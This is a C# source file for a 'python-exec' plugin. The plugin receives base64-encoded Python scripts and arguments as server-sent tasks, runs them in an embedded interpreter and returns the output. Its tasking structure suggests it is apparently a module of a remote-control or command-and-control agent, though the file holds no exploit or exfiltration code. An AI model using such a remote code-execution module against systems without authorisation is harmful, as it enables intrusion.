using Workflow.Contracts;
using System.Text.Json;
using Workflow.Models;
using Workflow.Utilities;
using System.Reflection;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "python-exec";
        private IDataBroker messageManager { get; set; }
        private IScriptEngine pythonManager { get; set; }
        private bool stdLibLoaded = false;

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
            this.pythonManager = context.ScriptEngine;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            PythonExecArgs pyArgs = JsonSerializer.Deserialize<PythonExecArgs>(job.task.parameters);
            if(pyArgs is null)
            {
                DebugLog.Log($"{Name} failed to parse args [{job.task.id}]");
                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "Failed to parse args.",
                    completed = true
                });
                return;
            }

            if (!stdLibLoaded)
            {
                DebugLog.Log($"{Name} loading stdlib [{job.task.id}]");
                if (!LoadStdLib())
                {
                    DebugLog.Log($"{Name} stdlib unavailable [{job.task.id}]");
                    messageManager.AddTaskResponse(new TaskResponse()
                    {
                        task_id = job.task.id,
                        user_output = "Failed to initialize python development, stdlib is unavailable You can still try to run scripts, but you'll need to manually import required libraries with python-load.",
                        completed = true
                    });
                    this.stdLibLoaded = true;
                    return;
                }
                this.stdLibLoaded = true;
            }

            byte[] scriptBytes = Misc.Base64DecodeToByteArray(pyArgs.file);
            string scriptContents = Misc.GetEncoding(scriptBytes).GetString(scriptBytes);
            string[] argv = Misc.SplitCommandLine(pyArgs.args);

            DebugLog.Log($"{Name} executing script [{job.task.id}]");
            messageManager.AddTaskResponse(new TaskResponse()
            {
                task_id = job.task.id,
                user_output = pythonManager.ExecuteScript(scriptContents, argv),
                completed = true
            });
            DebugLog.Log($"{Name} completed [{job.task.id}]");
        }

        private bool LoadStdLib()
        {
            byte[] libBytes = GetStdLib();

            return libBytes is null ? false : pythonManager.LoadPyLib(libBytes);
        }

        private byte[] GetStdLib()
        {
            using (Stream resFilestream = Assembly.GetExecutingAssembly().GetManifestResourceStream("python_exec.lib.zip"))
            {
                if (resFilestream == null)
                {
                    return null;
                }
                byte[] ba = new byte[resFilestream.Length];
                resFilestream.Read(ba, 0, ba.Length);
                return ba;
            }
        }
    }
}
